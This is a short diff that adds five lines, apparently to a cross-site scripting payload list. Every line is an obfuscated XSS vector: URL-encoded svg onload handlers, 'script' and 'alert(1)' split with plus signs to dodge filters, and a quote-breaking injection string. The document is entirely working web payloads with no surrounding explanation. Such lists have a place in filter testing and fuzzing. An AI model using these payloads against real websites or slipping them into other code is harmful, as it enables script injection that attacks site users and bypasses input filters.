@@ -1,0 +1,5 @@
+<svg%2Bonload%3D`<script`-alert(1)>
+<svg%2Bonload%3D`<s+c+r+i+p+t`-a+l+e+r+t(1)>
+<svg%2Bonload%3D-a+l+e+r+t(1)>
+">';a+l+e+r+t(1);'<=svg>
++<+svg+o+<+s+c+r+i+p+t+nload=a+l+e+r+t+(+1+)+>+
